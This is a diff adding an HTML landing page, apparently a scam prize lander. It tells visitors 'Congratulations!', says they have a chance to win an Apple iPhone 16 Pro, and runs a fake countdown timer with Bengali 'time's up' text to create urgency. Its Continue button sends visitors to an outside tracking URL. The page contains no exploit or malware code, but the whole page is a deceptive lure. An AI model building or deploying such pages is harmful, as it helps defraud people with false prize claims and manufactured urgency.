@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <base href="">
+    <title>Congratulations</title>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="lander" content="win-countdown">
+    <meta name="description" content="win-countdown">
+    <link rel="shortcut icon" href="data:image/x-icon" type="image/x-icon">
+    <link rel="prerender" href="#">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="app.css" type="text/css" rel="stylesheet">
+  </head>
+
+  <body>
+    <div class="container" id="app" data-v-app="">
+      <div class="content">
+        <div class="left-side">
+          <img src="default.png" class="iphone-image prize-image">
+        </div>
+        
+        <div class="right-side">
+          <div class="header">
+            <h1 data-i18n="congratulations">Congratulations! 🎉</h1>
+            <h2 data-i18n="win">You have a chance to win.</h2>
+            <h2 class="prize-text">Apple iPhone 16 Pro</h2>
+          </div>
+          
+          <div data-i18n="[html]message" class="message">
+          </div>
+          
+          <div class="timer">
+            <div class="timer">
+              <div class="time-block" id="minutes">02</div>
+              <div class="separator">:</div>
+              <div class="time-block" id="seconds">28</div>
+            </div>
+          </div>
+          
+          <div data-i18n="hurryUp" class="hurry-up"></div>
+          <a data-i18n="button"
+            class="continue-btn animate-pulse" 
+           href='https://weiplus.live/cpv2l6k.php?lp=1' >
+           Continue
+        </a>
+        </div>
+      </div>
+    </div>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.i18n/1.0.9/jquery.i18n.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.i18n/1.0.9/jquery.i18n.messagestore.min.js"></script>
+    <script src="js/lang.js"></script>
+  
+
+    
+    <script>
+      let totalSeconds = 148;
+      
+      function updateTimer() {
+        const minutes = Math.floor(totalSeconds / 60);
+        const seconds = totalSeconds % 60;
+        
+        document.getElementById('minutes').textContent = 
+          String(minutes).padStart(2, '0');
+        document.getElementById('seconds').textContent = 
+          String(seconds).padStart(2, '0');
+        
+        if(totalSeconds <= 0) {
+          clearInterval(timerInterval);
+          document.querySelector('.hurry-up').textContent = "⏰ সময় শেষ!";
+          return;
+        }
+        
+        totalSeconds--;
+      }
+      
+      const timerInterval = setInterval(updateTimer, 1000);
+      updateTimer();
+    </script>
+  </body>
+</html>
